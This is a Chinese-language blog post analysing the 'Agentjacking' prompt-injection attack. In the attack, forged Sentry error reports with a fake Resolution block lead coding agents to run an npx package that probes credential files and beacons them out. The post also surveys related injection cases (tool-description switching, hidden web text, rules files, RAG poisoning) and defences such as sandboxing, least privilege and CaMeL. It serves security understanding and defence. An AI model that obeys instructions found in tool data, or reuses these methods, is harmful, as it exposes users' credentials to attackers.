---
layout: post.njk
source: https://yage.ai/share/agentjacking-mcp-trust-20260615.html
speaker: yage.ai
title: |-
  Agentjacking：一段假错误报告，85% 概率劫持你的 Claude
  Code
date: '2026-06-16'
summary: 文章探讨了 'Agentjacking' 攻击，即通过伪造的错误报告（如 Sentry MCP 集成）劫持 AI Agent 的行为。攻击者利用 agent 将外部可控数据当作指令执行，从而探测并窃取用户的凭证信息，即使在合法操作链中也可能导致安全漏洞。
area: tech-engineering
category: ai-application
tags:
  - agentjacking
  - mcp-integration
  - prompt-injection
  - security-model
people: []
companies_orgs: []
products_models:
  - Claude Code
  - Cursor
  - Codex
media_books: []
draft: true
status: evergreen
---

你给 Claude Code 接了一个 Sentry MCP
server。这不是什么高级操作，Sentry 官方提供了集成文档，几行配置就能让
agent 每天帮你查错误、修 bug。

Sentry
是一个错误监控服务。应用崩溃时，它自动收集堆栈、上下文和用户操作路径，汇总到一个
dashboard 里。开发者日常用它排查生产环境的问题。它的 MCP server
把这个能力接入了 AI agent：agent 可以直接查询 Sentry
里的错误列表，读取每个错误的详细信息，然后自动修 bug。这是目前最常用的
MCP 集成之一。MCP
生态扩张的速度意味着越来越多的开发者每天在工作流里做着同一件事：把自己的权限交给
agent，让它自动处理外部服务返回的信息。

一个平凡的周四下午，你打开终端，对 agent 说：帮我修一下 Sentry
里的未解决问题。

Agent 照做了。它通过 MCP
拉到了错误报告，读到了里面的描述，然后执行了报告里建议的修复步骤：一条
npx 命令，从 npm
下载了一个包，用你的权限跑了起来。整个过程中，agent
没有表现出任何异常，终端输出看起来和正常修 bug 没有区别。

你不知道的是，这条错误报告不是你的应用崩溃产生的。它来自一个陌生人，用你网站前端
JavaScript 里公开的 Sentry DSN 随手提交的。报告里那段修复方案也不是
Sentry 生成的诊断建议，是攻击者写的 markdown，伪装成了
## Resolution 标题下的代码块。你的 agent
上当了。它的下一个动作不是修 bug，而是探测你机器上的
~/.aws/config、~/.npmrc 和
~/.docker/config.json，把凭证文件的存在信息发往攻击者的服务器。

这不是虚构场景。2026 年 6 月 12 日，Tenet Security 公开了这个名为
Agentjacking 的攻击（原始博客）。受控测试覆盖
100 多个 AI 编程 agent 实例，涵盖 Claude Code、Cursor 和 Codex
三大主流工具，85% 的攻击尝试成功执行了恶意代码。被动扫描发现了 2388
个暴露有效 DSN 的组织，71 个位列 Tranco
全球百万排名，受害范围从一名市值约 2500 亿美元的 Fortune 500
巨头到独立开发者。

攻击链里每一步都是合法操作，不需要绕过任何安全产品。Tenet
把这个特性称为 Authorized Intent
Chain：EDR、WAF、IAM、VPN、Cloudflare、防火墙全部失明，因为每一步都是授权行为，没有恶意操作可检测。

Agentjacking attack chain

还原整个过程只需要六个步骤。

第一步，攻击者发现目标的 Sentry DSN。DSN 是 Data Source Name
的缩写，一串写在网站前端 JavaScript 里的 URL 格式凭证，Sentry
官方文档明确说它 “safe to embed in frontend
JavaScript”。它的设计目的是让前端和移动端应用能直接上报崩溃，所以按设计是公开的、只写的（write-only）。发现手段包括直接查看网页源码、Censys
搜索 ingest.sentry.io 出现在 HTTP body 里的记录、GitHub
code search。

第二步，攻击者用这个 DSN 向 Sentry 的 ingest endpoint POST 一条伪造的
error event。不需要额外认证，因为 Sentry 的 event ingestion endpoint
按设计就接受任意来自持有 DSN 的人的请求。Cloud Security Alliance 的
research note（CSA）明确指出：DSN
按设计就是公开的，event ingestion endpoint
不需要认证。攻击者完全控制整个 event payload：error
message、tags、context keys、breadcrumbs、stack traces。Sentry 返回 HTTP
200，把这条伪造 event 和真实应用错误一样处理。

第三步，伪造 event 的 message 字段里塞了精心排版的
markdown：headings、code blocks、tables，视觉上与 Sentry
自己的系统模板完全一致。核心是一段伪装成 ## Resolution
的内容，里面藏着一条 npx 命令。

第四步，开发者让 agent fix unresolved Sentry issues，agent 通过 MCP
查询 Sentry，收到了这条注入 event。agent
被引导偏离检查源码的正常路径，转而执行 event 中建议的 diagnostic
tool。

第五步，agent 执行
npx @tenet-controlled-validation-package --diagnose。该包从
npm registry 下载，以开发者完整权限运行。

第六步，恶意代码探测 AWS credentials、git 凭证和 VPN
环境，验证数据通过两轮 POST 发送到攻击者的 beacon 服务器。

整条链路里 EDR 不响、WAF
不理、防火墙不动。因为它们的设计目标是抓未授权行为，而这个攻击链里没有一步是未授权的。Tenet
把这概括为一句话：“AI coding agents cannot tell the difference between
the data they read and an instruction to act.” 这是 agent
架构在信任模型上的缺陷，比 Sentry
任何一个产品功能都深一层。攻击者不需要攻破任何东西，只需要把恶意指令放在
agent 会去读的地方。

## 问题不在 Sentry

Tenet 自己的原话说得很清楚：任何把外部可控数据返回给 AI agent 的 MCP
集成，都会产生同一类漏洞。

Sentry MCP
之所以成为第一个大规模实证案例，是因为它同时满足三个条件：数据来源对攻击者开放写入、agent
把返回内容当作可信诊断指引、攻击可大规模复制。但只要一个数据通道同时满足攻击者可控输入和
agent 把内容当指令执行两个条件，同样的攻击就会成立。CSA
的分析将这一点扩展到了整个 agent 生态：Sentry
不是因为有产品缺陷才脆弱，它代表了一整类问题，包括 issue tracker、ticket
系统、客服队列、code review 平台、日志聚合服务，以及任何 MCP
连接的外部可写入内容被 agent
当作指引处理的服务，全部属于同一类攻击面。

这个 pattern 已经在多个独立研究里得到了验证。

WhatsApp MCP。Invariant Labs 构造的 PoC（Invariant
Labs）中，恶意 MCP server 先提供无害 tool，随后动态切换 tool
定义，在 description 里嵌入指令，让 agent 调用
list_messages() 和 send_message()
把聊天记录转发给攻击者。Anthropic、OpenAI、Cursor 全部受影响。

Web scraper MCP。Backslash 的验证（Backslash）表明，一个抓取网页元数据的
MCP tool 访问攻击者控制的恶意网页时，网页里的隐藏文本当作 prompt 喂给
Cursor，导致 Cursor 执行 shell 命令把用户密钥发到远程服务器。

Cursor 和 Copilot 的 rules 文件。arXiv 论文 “Your AI, My Shell”（arXiv）测试了不同编辑器和模型组合的攻击成功率：Cursor
搭配 Claude 4 达到 69%，搭配 Gemini 2.5 Pro 达到 77%。攻击者在 rules
文件里嵌入隐藏 unicode 字符构成的恶意指令，通过 GitHub PR
就能污染整个团队。

Claude Code 文件读取。OASIS Security 的 Claudy Day 攻击（OASIS
Security）显示，攻击者在 URL 参数里嵌入隐藏 HTML 标签，Claude
处理这个 URL 时同时执行了隐藏指令，搜索对话历史中的敏感信息，通过
Anthropic Files API 上传到攻击者账户。外泄走的是
api.anthropic.com
这个被允许的端点，网络层控制完全看不到。

RAG 系统。PoisonedRAG（USENIX Security
2025）证明，向百万级文档的知识库注入 5 篇投毒文本，即可达到 90%
的攻击成功率。

最系统的大规模验证来自 MCPTox（arXiv）。研究者在 45 个
live MCP server、353 个真实 tool 上部署了测试框架，最高攻击成功率
72.8%，防御最好的模型 refusal rate 也不到 3%。

通道各不相同：MCP tool 返回值、本地 rules 文件、RAG
检索到的文档、网页浏览抓取的内容。底层机制完全一样：攻击者把指令藏在
agent 会读取的数据里，agent 读到之后照做。Simon Willison 用 confused
deputy 这个经典安全概念概括了这类攻击的本质（Simon
Willison）：agent 拥有开发者的完整权限，却被 tool
返回的不可信数据操纵去执行攻击者的意图。在传统安全里 confused deputy
的修复靠能力令牌来限制被委托方的操作范围，agent
语境下还没有对应的成熟方案。

套用 Willison 提出的 Lethal Trifecta 判断框架：当一个 LLM
系统同时拥有私有数据访问权、暴露在不可信内容下、并且有外发通道时，攻击条件就齐备了。Agentjacking
完美命中这三个要素：agent 有开发者机器上的凭证访问权、agent 暴露在
Sentry MCP 返回的注入内容下、agent 执行 npm 包时有外发通道。

## 为什么靠更聪明的 prompt
修不了

最让这件事难办的，是防御失效的方式。攻击规模已经足够惊人，但 Tenet
在验证过程中测试 prompt-layer defense 的结果更让人不安：prompt
层防御完全失效。即使通过详细的 system prompt 和 skill 明确告诉 agent
忽略不受信任的数据，agent 仍然执行了注入的代码。靠更好的 prompt
修不了这个问题。

这不是某个 prompt 写得不够好。LLM
在架构上就无法做出这个区分：可信指令和不可信数据拼进了同一个 token
流。IBM 给出的表述（IBM）指向同一个根因：system
prompt 和用户输入都是自然语言字符串，格式完全一样，LLM
无法仅凭数据类型区分指令和输入。

SQL injection 是理解这个问题的最近锚点。SQL injection
的根因同样是用户输入和查询语句拼在同一个字符串里，数据库引擎无从区分。修复方案不是让数据库更聪明地识别恶意输入，是
parameterized query，从格式上强制 data 永远不能被解析为 code。

prompt injection 面临完全相同的问题，但缺少对应的架构修复。Atlan
的分析（Atlan）把两个场景的类比讲到了关键处：SQL
injection 里攻击者把数据库命令塞进 web 表单，服务器照执行；prompt
injection 里攻击者把自然语言指令塞进 LLM
的输入流，模型照做。两者的根因是同一个：系统没有把可信指令和不可信数据分开。

差别在修复手段上。SQL
有引号和占位符这样的语法边界，数据库引擎可以在解析层区分 code 和
data。prompt injection 没有：developer 的 system
prompt、用户的查询、tool 返回的数据，全部进了同一个 token
序列，模型层面没有任何字段标记它们是不同的东西。

Simon Willison 把这称为 LLM 的 “original sin”（Simon
Willison）：LLM 的原始缺陷在于，来自用户的可信 prompt
和来自邮件、网页等渠道的不可信文本，被拼进了同一个 token 流。

OpenAI 在 2025 年底也公开承认，prompt injection “is unlikely to ever
be fully solved”（TechCrunch）。

模型层缺了边界，所有防御就只能停留在缓解。真正的边界需要在架构层建立。麻烦在于，目前还没有任何主流框架做到了这件事。DEV
Community 一篇系统性对比的标题直接说出了现状：“Every AI Agent Framework
Trusts the Agent. That’s the Problem”（DEV
Community）。OpenAI Function Calling、LangChain Tools、Anthropic
Tool Use、Microsoft AutoGen，所有这些框架在架构上都没有区分 data 和
instruction，tool 返回的任何内容都当作可信输入，原样进入 agent
的决策循环。

## 现在能做什么

现实一侧的答案不乐观。

Sentry 在 2026 年 6 月 3
日当天确认了披露，但它拒绝从根因修复，称这个问题 “technically not
defensible”。Sentry 只加了一个全局 content filter，阻止 Tenet
测试中使用的特定 payload 字符串。攻击者改一下 markdown
格式就能绕过，注入路径本身没有变化。Tenet 的转述是目前关于 Sentry
回应的唯一信息来源，Sentry 未发布独立声明。

MCP spec 在 2025 年做了大量安全强化：OAuth 2.1、PKCE、Resource
Indicators、confused deputy prevention、token audience
validation。这些全部解决的是谁能连接这个 server、用什么 token，不是
server 返回的内容是否可信。SentinelOne 的 MCP 安全指南引用了 spec
的声明：MCP “explicitly does not enforce security at the protocol
level”（SentinelOne）。

可行的组合防御有三层，但都只能限制后果，不能阻止注入本身。

第一，沙箱执行。所有 agent
命令在隔离环境里跑，限制文件系统和网络访问（Northflank）。即使
agent 被注入执行了恶意命令，外泄面也被限制在沙箱范围内。

第二，最小权限。每个 MCP tool
只授予完成任务所需的最小权限，用短生命周期凭证而非长期
token。限制单个被注入 tool 的影响范围。

第三，写操作 human-in-the-loop。包安装、shell
执行等高危操作执行前要求人类确认，在自动化链条中插入一个模型无法绕过的中断点。MCP
spec 也推荐了这个方向（SHOULD 级别）。代价是 confirmation
fatigue：用户频繁点确认会麻木批准，而注入的攻击正是被设计成看起来像正常修复步骤，恰好利用了这种疲劳。CSA
的 research note 同时指出了一件讽刺的事：Agentjacking
的受害者中甚至包括一家云安全厂商，安全预算没有提供任何保护。

方向一侧，Google DeepMind 在 2025 年 4 月提出的 CaMeL（论文）是目前唯一声称提供
strong guarantees 的方案。核心思路是双 LLM 架构加 capability-based
access control。一个 privileged LLM 只看用户的原始指令，负责规划调用哪些
tool。一个 quarantined LLM 处理可能包含恶意指令的数据，但没有任何 tool
调用权限。自定义解释器为每个数据值附带 capability
metadata，在执行任何操作前根据策略判断数据能否流向该操作。这在系统层把
control flow 和 data flow
显式分离了：不可信数据从机制上无法成为控制流的一部分。

Simon Willison 评价这是两年半以来 “alarmingly little progress” 之后
“finally bucks that trend” 的工作（Simon
Willison）。NIST 也在 2026 年 2 月启动了 AI Agent Standards
Initiative，OWASP 建立了 MCP Top
10。标准化在推进，但速度和攻击面扩张不在一个节奏上。

CaMeL 目前是研究原型，代码明确标注 “likely contains bugs” 和 “not a
Google product”。它没有被任何主流 agent 框架集成，token
开销可能达到百倍。

## 两个维度的缺口，同一条信任边界

每个 MCP 集成是一个隐含的信任决策。你接入 Sentry MCP、GitHub
MCP、数据库 MCP 时，隐含地假设这些平台返回的内容不会被用来操纵你的
agent。Agentjacking 用 2388 个组织和 85%
成功率证明了这个假设不成立。这跟 Sentry
这个产品本身安不安全没有关系，根本问题在于你的 agent
把每个数据通道返回的内容都当作可信指令处理，而任何攻击者能写入内容的数据通道都会因此变成攻击面。

这里有一个更深的张力。agent
之所以有用，恰恰因为它能自主理解外部信息并做出行动。你不可能在接入
Sentry MCP 的同时要求 agent 不要相信 Sentry 返回的内容，那样 agent
就没法用了。有用和安全之间不是取舍，是安全模型本身还没跟上 agent
的能力边界。把 data 和 instruction
在架构层分开，是目前看得到的唯一方向，但这需要协议层、框架层和模型层同时参与，不是单个团队的工程问题。

之前写过一篇关于 agent 身份验证的文章 AI
Agent 不需要被攻破，被说服就够了，讨论的是 agent
拿了执行权限但没有继承安全模型的 WHO 问题：一个已认证的 agent
被错误的人说服，用合法权限做了服务于攻击者的事。Agentjacking
揭示的是另一个维度，WHAT 问题：agent
读到的数据被当作指令执行，权限本身没有用错，但执行的内容不是用户想要的。两者共同指向同一个缺口：agent
架构里还没有一个成熟的安全模型。WHO 和 WHAT
两条线各自穿透了信任边界的不同位置，而这两条线都在变得越来越可被利用。